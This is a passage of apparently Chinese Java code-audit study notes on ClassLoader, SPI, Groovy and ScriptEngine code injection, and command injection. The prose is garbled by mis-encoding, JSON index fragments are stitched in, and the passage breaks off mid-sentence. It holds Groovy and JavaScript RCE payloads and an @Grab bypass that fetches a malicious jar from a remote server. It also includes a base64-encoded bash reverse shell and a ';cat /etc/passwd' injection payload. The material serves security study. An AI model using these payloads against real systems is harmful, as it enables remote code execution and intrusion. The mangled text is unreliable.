è¾“äº†ä¸€ä¸ªjava.lang.Objectç±»ï¼Œé€šè¿‡åŒäº²æ¨¡å¼ä¼ é€’åˆ°å¯åŠ¨ç±»å½“ä¸­ï¼Œç„¶åå‘ç°å…¶Objectç±»æ—©å·²è¢«åŠ è½½è¿‡ï¼Œæ‰€ä»¥å°±ä¸ä¼šåŠ è½½è¿™ä¸ªç½‘ç»œä¼ è¾“è¿‡æ¥çš„java.lang.Objectç±» CLassLoaderç±»æ ¸å¿ƒæ–¹æ³• é™¤äº†ä¸Šè¿°BootstrapClassLoaderï¼Œå…¶ä»–ç±»åŠ è½½å™¨éƒ½æ˜¯ç»§æ‰¿äº†CLassLoaderç±»ï¼Œæˆ‘ä»¬å°±ä¸€èµ·çœ‹çœ‹å…¶ç±»çš„æ ¸å¿ƒæ–¹æ³•ã€‚ä»¥ä¸‹ä»£ç éƒ½æ˜¯æˆªå–äº†å…¶æ–¹æ³•çš„æºç ã€‚ 1ã€loadClass åŠ è½½æŒ‡å®šçš„javaç±» protected Class loadClass(String name, boolean resolve) throws ClassNotFoundException { synchronized (getClassLoadingLock(name)) { // First, check if the class has already been loaded Class c = findLoadedClass(name); if (c == null) { long t0 = System.nanoTime(); try { if (parent != null) { c = parent.loadClass(name, false); } else { c = findBootstrapClassOrNull(name); } } catch (ClassNotFoundException e) { // ClassNotFoundException thrown if class not found // from the non-null parent class loader } if (c == null) { // If still not found, then invoke findClass in order // to find the class. long t1 = System.nanoTime(); c = findClass(name); // this is the defining class loader; record the stats sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0); sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1); sun.misc.PerfCounter.getFindClasses().increment(); } } if (resolve) { resolveClass(c); } return c; } åœ¨loadClassæ–¹æ³•ä¸­ï¼Œå®ƒå…ˆä½¿ç”¨äº†findLoadedClass(String)æ–¹æ³•æ¥æ£€æŸ¥è¿™ä¸ªç±»æ˜¯å¦è¢«åŠ è½½è¿‡ã€‚ æ¥ç€ä½¿ç”¨çˆ¶åŠ è½½å™¨è°ƒç”¨loadClassï¼ˆStringï¼‰æ–¹æ³•ï¼Œå¦‚æœçˆ¶åŠ è½½å™¨ä¸ºnullï¼Œç±»åŠ è½½å™¨åŠ è½½jvmå†…ç½®çš„åŠ è½½å™¨ã€‚ ä¹‹åå°±è°ƒç”¨findClass(String) æ–¹æ³•è£…è½½ç±»ã€‚ æœ€åé€šè¿‡ä¸Šè¿°æ­¥éª¤æˆ‘ä»¬æ‰¾åˆ°äº†å¯¹åº”çš„ç±»ï¼Œå¹¶ä¸”æ¥æ”¶åˆ°çš„resolveå‚æ•°çš„å€¼ä¸ºtrue,é‚£ä¹ˆå°±ä¼šè°ƒç”¨resolveClass(Class)æ–¹æ³•æ¥å¤„ç†ç±»ã€‚ 2ã€findCLass æŸ¥æ‰¾æŒ‡å®šçš„Javaç±» protected Class findClass(String name) throws ClassNotFoundException { throw new ClassNotFoundException(name); } 3ã€findLoadedClass æŸ¥æ‰¾JVMå·²ç»åŠ è½½è¿‡çš„ç±» protected final Class findLoadedClass(String name) { if (!checkName(name)) return null; return findLoadedClass0(name); } 4ã€defineClass å®šä¹‰ä¸€ä¸ªJavaç±»ï¼Œå°†å­—èŠ‚ç è§£ææˆè™šæ‹Ÿæœºè¯†åˆ«çš„Classå¯¹è±¡ï¼ˆå°±æ˜¯åœ¨JVMä¸­æ³¨å†Œè¯¥ç±»ï¼‰ã€‚å¾€å¾€å’ŒfindClass()æ–¹æ³•é…åˆä½¿ç”¨ã€‚ protected final Class defineClass(byte[] b, int off, int len) throws ClassFormatError { return defineClass(null, b, off, len, null); } 5ã€resolveClass é“¾æ¥æŒ‡å®šJavaç±» protected final void resolveClass(Class c) { resolveClass0(c); } private native void resolveClass0(Class c); è‡ªå®šä¹‰ç±»åŠ è½½å™¨è¿‡ç¨‹ å› ä¸ºåœ¨å®é™…åº”ç”¨è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬ä¸ä»…ä»…åªå¸Œæœ›ä½¿ç”¨classpathå½“ä¸­æŒ‡å®šçš„ç±»æˆ–è€…jaråŒ…è¿›è¡Œè°ƒç”¨ä½¿ç”¨ï¼Œæˆ‘ä»¬æœ‰æ—¶å¸Œæœ›è°ƒç”¨æœ¬åœ°ç£ç›˜æ–‡ä»¶æˆ–è€…ç½‘ç»œè¿˜å¯ä»¥ä½¿ç”¨è‡ªå®šä¹‰ç±»åŠ è½½å™¨çš„æ–¹å¼ã€‚ åœ¨ä¸Šé¢loadClassæ–¹æ³•åˆ†æä¸­ï¼Œä»–å†…éƒ¨å…¶å®æ˜¯è°ƒç”¨findClass(String) æ–¹æ³•æ¥è£…è½½ç±»ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æƒ³åŠ è½½è‡ªå·±è‡ªå®šä¹‰çš„ç±»ï¼Œå°±æ˜¯è¦†ç›–è¿™ä¸ªfindClass(String) æ–¹æ³•ï¼Œè€Œä¸æ˜¯loadClassæ–¹æ³•ã€‚ ä»¥ä¸‹å°±æ˜¯è‡ªå®šä¹‰ç±»åŠ è½½å™¨æ­¥éª¤ï¼š 1ã€ç»§æ‰¿ClassLoaderç±» 2ã€è¦†ç›–findClass()æ–¹æ³• 3ã€åœ¨findClass()æ–¹æ³•ä¸­è°ƒç”¨defineClass()æ–¹æ³• è¿™é‡Œæˆ‘ä»¬å€ŸåŠ©ä¸€ä¸ªåŠ å¯†javaç±»å­—èŠ‚ç ä¾‹å­æ¥è®²è§£ã€‚ è¿™é‡Œæˆ‘ä»¬å…ˆåˆ›å»ºä¸€ä¸ªCypherTest.javaæ–‡ä»¶ï¼Œç„¶åä½¿ç”¨java -d . CypherTest.javaï¼Œç„¶åå°±èƒ½ç”ŸæˆCypherTest.classæ–‡ä»¶äº†ã€‚ CypherTest.javaæ–‡ä»¶ package com.test; public class CypherTest { public static void main(String[] args) { System.out.println(\"This experiment test is successful\"); } } ç›®å½•ä¸‹ç”Ÿæˆäº†CypherTest.classæ–‡ä»¶ã€‚ ä¹‹åæˆ‘ä»¬ç¼–å†™ä¸€ä¸ªåŠ å¯†ç±»Encryptionï¼Œä½¿ç”¨ç®€å•çš„é€ä½å–åè¿›è¡ŒåŠ å¯†æ“ä½œã€‚ package com.testCypher; import java.io.*; public class Encryption { public static void main(String[] args) { encode(new File(\"/usr/local/com/test/CypherTest.class\"), // è·å–è·¯å¾„CypherTest.classæ–‡ä»¶ new File(\"/usr/local/temp/com/test/CypherTest.class\")); // ä¸ºäº†ä¿æŒä¸€è‡´ï¼Œåˆ›å»ºäº†ä¸€ä¸ªç©ºçš„tempç›®å½• } public static void encode(File src, File dest) { FileInputStream fis = null; FileOutputStream fos = null; try { fis = new FileInputStream(src); fos = new FileOutputStream(dest); // é€ä½å–åæ“ä½œ int temp = -1; while ((temp = fis.read()) != -1) {// è¯»å–ä¸€ä¸ªå­—èŠ‚ fos.write(temp ^ 0xff);// å–åè¾“å‡º } } catch (IOException e) { } finally { // å…³é—­æ•°æ®æµ if (fis != null) { try { fis.close(); } catch (IOException e) { e.printStackTrace(); } try { fos.close(); } catch (IOException e) { e.printStackTrace(); } } } System.out.println(\"This experiment test is successful\"); } } ä¹‹åæˆ‘ä»¬çœ‹åˆ°ç”Ÿæˆäº†åŠ å¯†åæ–°çš„CypherTest.classæ–‡ä»¶ã€‚ å› ä¸ºè¿™ä¸ªæ˜¯è‡ªå®šä¹‰åŠ å¯†åï¼Œæˆ‘ä»¬æ— æ³•ä½¿ç”¨å·¥å…·ç›´æ¥è¿›è¡Œåç¼–è¯‘æ“ä½œå’Œç›´æ¥ä½¿ç”¨jvmé»˜è®¤ç±»åŠ è½½å™¨å»ä½¿ç”¨å®ƒã€‚ ä¹‹åæˆ‘ä»¬å†ç¼–å†™ä¸€ä¸ªDectyptionè§£å¯†ç±»ï¼Œå¯¹æ–°åŠ å¯†çš„CypherTest.classè¿›è¡Œè§£å¯†æ“ä½œã€‚ package com.testCypher; import java.io.ByteArrayOutputStream; import java.io.FileInputStream; import java.io.IOException; import java.io.InputStream; public class Decryption extends ClassLoader { // ç»§æ‰¿ClassLoaderç±» private String rootDir; public Decryption(String rootDir) { this.rootDir = rootDir; } @Override // é‡å†™è¦†ç›–findClass protected Class findClass(String className) throws ClassNotFoundException { Class c = findLoadedClass(className); if (c != null) { return c; } else { ClassLoader parent = this.getParent(); try { c = parent.loadClass(className); } catch (ClassNotFoundException e) { // System.out.println(\"çˆ¶ç±»æ— æ³•åŠ è½½ä½ çš„classï¼ŒæŠ›å‡ºClassNotFoundException,å·²æ•è·ï¼Œç»§ç»­è¿è¡Œ\"); } if (c != null) { System.out.println(\"çˆ¶ç±»æˆåŠŸåŠ è½½\"); return c; } else {// è¯»å–æ–‡ä»¶ è½¬åŒ–æˆå­—èŠ‚æ•°ç»„ byte[] classData = getClassData(className); if (classData == null) { throw new ClassNotFoundException(); } else { // è°ƒç”¨defineClass()æ–¹æ³• c = defineClass(className, classData, 0, classData.length); return c; } } } } public byte[] getClassData(String className) { String path = rootDir + \"/\" + className.replace('.', '/') + \".class\"; // å°†æµä¸­çš„æ•°æ®è½¬æ¢ä¸ºå­—èŠ‚æ•°ç»„ InputStream is = null; ByteArrayOutputStream baos = new ByteArrayOutputStream(); try { is = new FileInputStream(path); byte[] buffer = new byte[1024]; int temp = -1; while ((temp = is.read()) != -1) { baos.write(temp ^ 0xff); } return baos.toByteArray(); } catch (Exception e) { e.printStackTrace(); return null; } finally { if (is != null) { try { is.close(); } catch (IOException e) { e.printStackTrace(); } } if (baos != null) { try { baos.close(); } catch (IOException e) { e.printStackTrace(); } } } } } è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨å°†Decryptionç»§æ‰¿ClassLoaderç±»ï¼Œä¹‹åè¦†ç›–findClass()æ–¹æ³•ï¼Œå¹¶ä¸”åœ¨findClass()æ–¹æ³•ä¸­è°ƒç”¨defineClass()æ–¹æ³•ä½¿ç”¨ï¼Œæœ€ååŠ è½½æˆ‘ä»¬è‡ªå®šä¹‰çš„getClassDataæ–¹æ³•å»è¿›è¡Œè§£å¯†æ“ä½œã€‚ æœ€åæˆ‘ä»¬ä½¿ç”¨ä¸€ä¸ªDemoè¿›è¡Œæµ‹è¯•ï¼Œå»æŸ¥çœ‹å½“å‰ç±»åŠ è½½å™¨æœºåˆ¶çš„æƒ…å†µã€‚å¦‚æœæˆ‘ä»¬æƒ³è¦è·å–å…¶è¾“å‡ºçš„System.out.printlnè¯­å¥ï¼Œéœ€è¦åå°„æœºåˆ¶å»å®ç°ã€‚è¿™ç¯‡æ–‡ç« æˆ‘ä»¬åªå­¦ä¹ ClassLoaderç±»åº”ç”¨ï¼Œå°±ä¸å»æ¶‰åŠå…¶ä»–çŸ¥è¯†ç‚¹ï¼Œè·å–å…¶ç±»åŠ è½½å™¨æŸ¥çœ‹å³å¯ã€‚ package com.testCypher; public class Demo { public static void main(String[] args) throws ClassNotFoundException { Decryption deLoader = new Decryption(\"/usr/local/temp/\");// è§£å¯†åŠ è½½å™¨ Class t1 = deLoader.loadClass(\"com.test.CypherTest\");// åŠ è½½å·²åŠ å¯†çš„ç±» System.out.println(\"c3 çš„Classæ˜¯ \" + t1); } } URLClassLoader é™¤äº†ä¸Šè¿°è‡ªå®šä¹‰ClassLoaderç±»ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥å­¦ä¹ URLClassLoaderã€‚URLClassLoaderç±»ç»§æ‰¿ClassLoaderç±»ï¼Œå¯ä»¥åŠ è½½æœ¬åœ°ç£ç›˜å’Œç½‘ç»œä¸­çš„jaråŒ…ç±»æ–‡ä»¶ã€‚ 1. æœ¬åœ°ç£ç›˜classæ–‡ä»¶è°ƒç”¨ é¦–å…ˆæˆ‘åœ¨Dç›˜åˆ›å»ºäº†ä¸€ä¸ªTest.javaæ–‡ä»¶ï¼Œå†™äº†ä¸€æ®µcalc.exeè®¡ç®—æœºå¼¹çª—ä»£ç ã€‚å¦‚æœæ–‡ä»¶è¢«æˆåŠŸè§£ææ‰§è¡Œï¼Œä¼šè¾“å‡ºTest successå­—æ®µä¸”å¼¹å‡ºè®¡ç®—å™¨ã€‚ package com.test; public class Test { public Test(){ System.out.println(\"Test success!!!\"); try{ Runtime.getRuntime().exec(\"cmd /c calc.exe\"); } catch(Exception e) { e.printStackTrace(); } } } ç„¶åä½¿ç”¨javacè¿›è¡Œç¼–è¯‘ï¼Œåœ¨Dç›˜ç”Ÿæˆå¯¹åº”çš„classæ–‡ä»¶ã€‚ ä¹‹åæˆ‘ä»¬å†ä¿®æ”¹ClassLoaderTestç±»ï¼Œåˆ©ç”¨URLClassLoaderæ–¹å¼å»è·å–Dç›˜ä¸­Test.classæ–‡ä»¶ã€‚ package com.Classloader; import java.io.File; import java.net.URI; import java.net.URL; import java.net.URLClassLoader; public class ClassLoaderTest { public static void main(String[] args) throws Exception{ File file = new File(\"d:/\"); URI uri = file.toURI(); URL url = uri.toURL(); URLClassLoader classLoader = new URLClassLoader(new URL[]{url}); Class clazz = classLoader.loadClass(\"com.test.Test\"); clazz.newInstance(); } } è¿™é‡Œä½¿ç”¨Fileè·å–ç±»æ–‡ä»¶è·¯å¾„ï¼Œä¹‹åä½¿ç”¨URLClassLoaderè·å–urlåœ°å€ä¸ºDç›˜ï¼Œä¹‹åä½¿ç”¨loadClassæ–¹æ³•è·å–Test.classæ‰€å«åŒ…åï¼Œç„¶åå®ä¾‹åŒ–ã€‚è¿è¡Œå‘ç°è§£æè·å–åˆ°äº†Dç›˜ä¸­Test.classæ–‡ä»¶ã€‚ 2. ç½‘ç»œä¼ è¾“classæ–‡ä»¶è°ƒç”¨ ä¹‹åæˆ‘ä»¬å°†Test.classæ”¾ç½®åˆ°ç”µè„‘çš„TomcatæœåŠ¡å™¨ç›®å½•ä¸‹ï¼Œç„¶åå¯åŠ¨Tomcatã€‚ä¹‹åæ–°å»ºä¸ªClassLoaderDemoç±»ç½‘ç»œåŠ è½½TomcatæœåŠ¡å™¨ä¸­çš„Test.class. package com.Classloader; import java.net.URL; import java.net.URLClassLoader; public class ClassLoaderDemo { public static void main(String[] args) throws Exception { URL url = new URL(\"http://localhost:8080/examples/\"); URLClassLoader classLoader = new URLClassLoader(new URL[]{url}); Class clazz = classLoader.loadClass(\"com.test.Test\"); clazz.newInstance(); } } è¿™é‡Œä½¿ç”¨URLClassLoaderåŠ è½½ç½‘ç»œä¸­çš„TomcatæœåŠ¡å™¨ç›®å½•ï¼ŒæˆåŠŸè§£æè·å–åˆ°äº†ç›®å½•ä¸‹çš„Test.classæ–‡ä»¶ã€‚ å°ç»“ é€šè¿‡ClassLoaderç±»çš„å­¦ä¹ ï¼Œæˆ‘ä»¬çŸ¥é“ä¸ä»…ä»…å±€é™äºåœ¨ClassPathä¸­ç±»çš„è°ƒç”¨ï¼Œè¿˜èƒ½å¤Ÿé€šè¿‡è‡ªå®šä¹‰CLassLoaderç±»æ¥åŠ è½½æˆ‘ä»¬ç‰¹å®šçš„ç±»æ¥æ“ä½œåˆ©ç”¨ã€‚åœ¨å®‰å…¨é¢†åŸŸå½“ä¸­ï¼Œæˆ‘ä»¬å¾€å¾€ä¼šä½¿ç”¨å…¶ClassLoaderç‰¹æ€§ï¼Œè‡ªå®šä¹‰æ¶æ„çš„ç±»åŠ è½½webshellåˆ©ç”¨ä»¥åŠè‡ªå®šä»¥ç±»å­—èŠ‚ç çš„nativeæ–¹æ³•ç»•è¿‡RASPæ£€æµ‹ã€‚æ‰€ä»¥äº†è§£ClassLoaderç‰¹æ€§å¹¶è¿›è¡Œè‡ªå®šä¹‰ç¼–å†™ï¼Œå¯¹æˆ‘ä»¬äº†è§£javaå®‰å…¨æœºåˆ¶ååˆ†é‡è¦ã€‚ Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2023-10-21 22:36:46 "},"03.ä»£ç å®¡è®¡/JAVA/01.åŸºç¡€çŸ¥è¯†/SPI.html":{"url":"03.ä»£ç å®¡è®¡/JAVA/01.åŸºç¡€çŸ¥è¯†/SPI.html","title":"SPI","keywords":"","body":"SPI SPI ï¼Œå…¨ç§°ä¸º Service Provider Interfaceï¼Œæ˜¯Javaä¸­ç”¨äºå®šä¹‰æ¥å£ï¼Œå¹¶å…è®¸å¤–éƒ¨æ¨¡å—æä¾›è¯¥æ¥å£å®ç°çš„ä¸€ç§æœºåˆ¶ã€‚åº”ç”¨ç¨‹åºé€šè¿‡ SPI å‘ç°å’ŒåŠ è½½æœåŠ¡æä¾›è€…ï¼ˆå³æ¥å£çš„å…·ä½“å®ç°ï¼‰ã€‚ package com.yyds; import sun.misc.Service; import java.util.Iterator; import java.util.ServiceLoader; public class Test { public static void main(String[] args) { // sun.misc.Service.providersè¿”å›å®ç°äº† SPIService æ¥å£çš„æ‰€æœ‰æœåŠ¡æä¾›è€…çš„è¿­ä»£å™¨ Iterator providers = Service.providers(SPIService.class); // éå†å®ç°ç±»æ‰§è¡Œexecute()æ–¹æ³• while(providers.hasNext()) { SPIService ser = providers.next(); ser.execute(); } System.out.println(\"--------------------------------\"); // ServiceLoader.load()æŸ¥æ‰¾å¹¶åŠ è½½å®ç°äº† SPIService æ¥å£çš„æ‰€æœ‰å®ç°ç±» ServiceLoader load = ServiceLoader.load(SPIService.class); Iterator iterator = load.iterator(); // éå†å®ç°ç±»æ‰§è¡Œexecute()æ–¹æ³• while(iterator.hasNext()) { SPIService ser = iterator.next(); ser.execute(); } } } å®‰å…¨æ€§é—®é¢˜ ç¼–å†™ä¸€ä¸ªæ¶æ„çš„æœåŠ¡æä¾›è€…ï¼ˆæ¥å£å®ç°ç±»ï¼‰ å¹¶äºæœåŠ¡ä¸­æ³¨å†Œ,ä»è€Œè®©åº”ç”¨ç¨‹åºåŠ è½½å¹¶æ‰§è¡Œæ¶æ„ä»£ç  Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-24 21:20:58 "},"03.ä»£ç å®¡è®¡/JAVA/02.åŸºç¡€æ¼æ´/ä»£ç æ³¨å…¥.html":{"url":"03.ä»£ç å®¡è®¡/JAVA/02.åŸºç¡€æ¼æ´/ä»£ç æ³¨å…¥.html","title":"ä»£ç æ³¨å…¥","keywords":"","body":"Groovy åŸºæœ¬ä»‹ç» Groovyæ˜¯JVMçš„ä¸€ä¸ªæ›¿ä»£è¯­è¨€ï¼ˆæ›¿ä»£æ˜¯æŒ‡å¯ä»¥ç”¨Groovyåœ¨Javaå¹³å°ä¸Šè¿›è¡ŒJavaç¼–ç¨‹ï¼‰ é€šè¿‡Groovyæ¥è¾¾åˆ°å‘½ä»¤æ‰§è¡Œdemoï¼Œtest.groovyå¦‚ä¸‹ class test { static void main(args){ def cmd = \"calc\"; println \"${cmd.execute()}\"; } } // ç›´æ¥å‘½ä»¤æ‰§è¡Œ Runtime.getRuntime().exec(\"calc\") \"calc\".execute() 'calc'.execute() \"${\"calc\".execute()}\" \"${'calc'.execute()}\" // å›æ˜¾å‹å‘½ä»¤æ‰§è¡Œ println \"whoami\".execute().text println 'whoami'.execute().text println \"${\"whoami\".execute().text}\" println \"${'whoami'.execute().text}\" def cmd = \"whoami\";println \"${cmd.execute().text}\"; ç›¸å…³åœºæ™¯ å¦‚æœå¤–éƒ¨å¯æ§è¾“å…¥Groovyä»£ç æˆ–è€…å¤–éƒ¨å¯ä¸Šä¼ ä¸€ä¸ªæ¶æ„çš„Groovyè„šæœ¬ï¼Œä¸”ç¨‹åºå¹¶æœªå¯¹è¾“å…¥çš„Groovyä»£ç è¿›è¡Œæœ‰æ•ˆçš„è¿‡æ»¤ï¼Œé‚£ä¹ˆä¼šå¯¼è‡´æ¶æ„çš„Groovyä»£ç æ³¨å…¥ï¼Œä»è€ŒRCE GroovyShell groovy.lang.GroovyShellå¯ä»¥è§£æä»»æ„Groovyè¡¨è¾¾å¼çš„å€¼å’Œè¿è¡Œä»»æ„Groovyè„šæœ¬ // è§£æä»»æ„Groovyè¡¨è¾¾å¼ import groovy.lang.GroovyShell; public class GroovyShellExample { public static void main( String[] args ) { GroovyShell groovyShell = new GroovyShell(); groovyShell.evaluate(\"\\\"calc\\\".execute()\"); } } // è¿è¡Œä»»æ„Groovyè„šæœ¬ import groovy.lang.GroovyShell; import groovy.lang.Script; import java.io.File; public class GroovyShellExample { public static void main( String[] args ) throws Exception { //é€šè¿‡åŠ è½½æœ¬åœ°è„šæœ¬ GroovyShell shell = new GroovyShell(); Script script = shell.parse(new File(\"src/main/java/ysoserial/vulndemo/GroovyTest.groovy\")); script.run(); GroovyShell shell = new GroovyShell(); shell.evaluate(new File(\"src/main/java/ysoserial/vulndemo/GroovyTest.groovy\")); //é€šè¿‡åŠ è½½è¿œç¨‹è„šæœ¬ GroovyShell shell = new GroovyShell(); shell.evaluate(new URI(\"http://127.0.0.1:8888/GroovyTest.groovy\")); } } GroovyScriptEngine //é€šè¿‡ä¼ å…¥æ ¹è·¯å¾„ä¹‹åè°ƒç”¨å¯¹åº”çš„è„šæœ¬ GroovyScriptEngine scriptEngine = new GroovyScriptEngine(\"src/main/java/ysoserial/vulndemo\"); scriptEngine.run(\"GroovyTest.groovy\", \"\"); //é€šè¿‡è°ƒç”¨è¿œç¨‹urlä¹‹åè°ƒç”¨ç‰¹å®šè„šæœ¬ GroovyScriptEngine scriptEngine = new GroovyScriptEngine(\"http://127.0.0.1:8888/\"); scriptEngine.run(\"GroovyTest.groovy\", \"\"); //é€šè¿‡BindingåŠ è½½ GroovyScriptEngine scriptEngine = new GroovyScriptEngine(\"\"); scriptEngine.run(\"src/main/java/ysoserial/vulndemo/GroovyTest.groovy\", new Binding()); GroovyClassLoader //ä»æ–‡ä»¶ä¸­è·å–Groovyç±» GroovyClassLoader groovyClassLoader = new GroovyClassLoader(); Class aClass = groovyClassLoader.parseClass(new File(\"src/main/java/ysoserial/vulndemo/GroovyTest.groovy\")); GroovyObject object = (GroovyObject) aClass.newInstance(); object.invokeMethod(\"main\", \"\"); //ä»æ–‡æœ¬ä¸­è·å–Groovyç±» GroovyClassLoader groovyClassLoader = new GroovyClassLoader(); Class aClass = groovyClassLoader.parseClass(\"class GroovyTest {\\n\" + \" static void main(args){\\n\" + \" println \\\"${'whoami'.execute().text}\\\"\\n\" + \"\\n\" + \" }\\n\" + \"}\"); GroovyObject groovyObject = (GroovyObject) aClass.newInstance(); groovyObject.invokeMethod(\"main\", \"\"); ScriptEngine ScriptEngine scriptEngine = new ScriptEngineManager().getEngineByName(\"groovy\"); System.out.println(scriptEngine.eval(\"\\\"whoami\\\".execute().text\")); ByPass @ASTæ³¨è§£æ‰§è¡Œæ–­è¨€ this.class.classLoader.parseClass(''' @groovy.transform.ASTTest(value={ assert Runtime.getRuntime().exec(\"calc\") }) def x '''); @Grabæ³¨è§£åŠ è½½è¿œç¨‹æ¶æ„ç±» //@Grabæ³¨è§£åŠ è½½è¿œç¨‹æ¶æ„ç±» this.class.classLoader.parseClass(\"\"\" @GrabConfig(disableChecksums=true) // åŠ è½½ä¾èµ–ä¼šçœ‹æœ¬åœ°ä»“åº“æ˜¯å¦æœ‰ï¼Œå¦‚æœæ²¡æœ‰å°±ä»rootæœåŠ¡å™¨çš„group/module/versionç›®å½•é‡Œé¢ä¸‹è½½EvilJar.jaræ–‡ä»¶ï¼Œé»˜è®¤å­˜æ”¾åœ¨~/.groovy/grapesç›®å½•ä¸‹ @GrabResolver(name=\"Poc\", root=\"http://ip:8888/\") @Grab(group=\"Poc\", module=\"EvilJar\", version=\"0\") import java.lang.String \"\"\"); è¿œç¨‹æ¶æ„ç±» //Poc.java public class Poc{ Poc() throws Exception{ Runtime.getRuntime().exec(\"calc\"); } } //ç¼–è¯‘æˆ.classæ–‡ä»¶ javac Poc.java //åˆ›å»ºç›®å½• mkdir -p META-INF/services/ //åœ¨org.codehaus.groovy.plugins.Runnersä¸­å†™å…¥åŠ è½½çš„ç±»åPoc echo Poc > META-INF/services/org.codehaus.groovy.plugins.Runners //å°†.classæ–‡ä»¶æ‰“åŒ…æˆjaråŒ… jar cvf EvilJar Poc.class META-INF/ //åˆ›å»ºæ”¾jaråŒ…çš„ç›®å½• mkdir -p group/module/version/ //å°†jaråŒ…å¤åˆ¶åˆ°è¯¥ç›®å½•ä¸‹ mv EvilJar group/module/version //ä¹‹åå¼€å¯httpæœåŠ¡ python -m http.server --bind 0.0.0.0 8888 ScriptEngine åŸºæœ¬ä»‹ç» javax.script.ScriptEngineç±»æ˜¯javaè‡ªå¸¦çš„ç”¨äºè§£æå¹¶æ‰§è¡Œjsä»£ç ,å¯ä»¥åœ¨javascriptä¸­æ‰§è¡Œjavaä»£ç . æ¼æ´ä»£ç  ScriptEngine engine = new ScriptEngineManager().getEngineByName(\"js\"); Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE); String cmd = String.format(\"load(\\\"%s\\\")\", jsurl); engine.eval(cmd, bindings); jscmd.js var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec(\"calc\");} Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-24 21:19:48 "},"03.ä»£ç å®¡è®¡/JAVA/02.åŸºç¡€æ¼æ´/å‘½ä»¤æ³¨å…¥.html":{"url":"03.ä»£ç å®¡è®¡/JAVA/02.åŸºç¡€æ¼æ´/å‘½ä»¤æ³¨å…¥.html","title":"å‘½ä»¤æ³¨å…¥","keywords":"","body":"å‘½ä»¤æ‰§è¡Œæ–¹æ³• Runtime // å›æ˜¾ InputStream in = Runtime.getRuntime().exec(\"whoami\").getInputStream(); Runtime run = Runtime.getRuntime(); Process p = run.exec(cmd); BufferedInputStream in = new BufferedInputStream(p.getInputStream()); // åå¼¹shell Runtime.getRuntime().exec(\"bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEyNy4wLjAuMS84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}\"); ProcessBuilder InputStream in = new ProcessBuilder(\"whoami\").start().getInputStream(); String[] arrCmd = {\"/bin/sh\", \"-c\", cmd}; ProcessBuilder processBuilder = new ProcessBuilder(arrCmd); Process p = processBuilder.start(); BufferedInputStream in = new BufferedInputStream(p.getInputStream()); ProcessImpl String[] cmds = new String[]{\"whoami\"}; // éœ€è¦é€šè¿‡åå°„è·å– Class clazz = Class.forName(\"java.lang.ProcessImpl\"); // ProcessBuilder.startæ–¹æ³•æ˜¯å‘½ä»¤æ‰§è¡Œ Method method = clazz.getDeclaredMethod(\"start\", String[].class, Map.class, String.class, Redirect[].class, boolean.class); method.setAccessible(true); Process e = (Process) method.invoke(null, cmds, null, \".\", null, true); UNIXProcess String[] cmds = new String[]{\"whoami\"}; Class clazz = Class.forName(\"java.lang.UNIXProcess\"); Method start = clazz.getDeclaredMethod(\"start\", String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class); start.setAccessible(true); Process process = (Process) start.invoke(null, cmds, null, \".\", null, true); JNI JNIçš„å…¨ç§°å«åšï¼ˆJava Native Interfaceï¼‰ï¼Œå…¶ä½œç”¨å°±æ˜¯è®©æˆ‘ä»¬çš„Javaç¨‹åºå»è°ƒç”¨Cçš„ç¨‹åºã€‚å®é™…ä¸Šè°ƒç”¨çš„å¹¶ä¸æ˜¯exeç¨‹åºï¼Œè€Œæ˜¯ç¼–è¯‘å¥½çš„dllåŠ¨æ€é“¾æ¥åº“é‡Œé¢å°è£…çš„æ–¹æ³• å®šä¹‰ä¸€ä¸ªnativeä¿®é¥°çš„æ–¹æ³• ä½¿ç”¨javahè¿›è¡Œç¼–è¯‘ ç¼–å†™å¯¹åº”çš„cè¯­è¨€ä»£ç  ä½¿ç”¨gccç¼–è¯‘æˆdllæ–‡ä»¶ ç¼–å†™ä¸€ä¸ªJavaç±»ä½¿ç”¨System.loadLibraryæ–¹æ³•ï¼ŒåŠ è½½dllæ–‡ä»¶å¹¶ä¸”è°ƒç”¨ https://www.javasec.org/java-vuls/JNI.html å‘½ä»¤æ³¨å…¥æ¼æ´Demo // å‚æ•°æ³¨å…¥ String[] cmdList = new String[]{\"sh\", \"-c\", \"ls -al \" + filepath}; ProcessBuilder builder = new ProcessBuilder(cmdList); builder.redirectErrorStream(true); Process process = builder.start(); // hostæ³¨å…¥ String host = request.getHeader(\"host\"); String[] cmdList = new String[]{\"sh\", \"-c\", \"curl\" + host}; ProcessBuilder builder = new ProcessBuilder(cmdList); builder.redirectErrorStream(true); Process process = builder.start(); payload ?filepath=/tmp;cat /etc/passwd é—®é¢˜ Runtimeå’ŒProcessBuilderçš„åº•å±‚å®é™…ä¸Šéƒ½æ˜¯ProcessImplã€‚è€Œä¸èƒ½æ‰§è¡Œdirå‘½ä»¤çš„åŸå› æ˜¯javaä¼šå¯¹æœ€åçš„æˆ‘ä»¬ä¼ å…¥çš„cmdstrè¿›è¡Œä»¥ç©ºæ ¼åˆ†å‰²ï¼Œä¹Ÿå°±æ˜¯â€echo 